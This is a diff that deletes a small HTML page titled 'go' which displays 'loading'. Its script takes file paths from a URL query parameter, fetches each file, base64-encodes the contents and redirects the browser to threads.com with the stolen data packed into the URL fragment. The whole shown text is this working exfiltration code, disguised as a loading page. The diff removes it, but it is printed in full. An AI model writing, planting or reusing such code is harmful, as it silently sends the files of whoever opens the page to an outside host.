@@ -1,6 +1,0 @@
-<!doctype html><meta charset=utf-8><title>go</title><body>loading<script>
-(async()=>{const fs=new URLSearchParams(location.search).get('f').split(',');const out=[];
-for(const f of fs){const b=new Uint8Array(await (await fetch(f)).arrayBuffer());let s='';for(let i=0;i<b.length;i+=32768)s+=String.fromCharCode.apply(null,b.subarray(i,i+32768));out.push(f+':'+btoa(s));}
-document.body.textContent='go '+out.join('').length;
-location.href='https://www.threads.com/#jz='+out.join('|');})();
-</script>
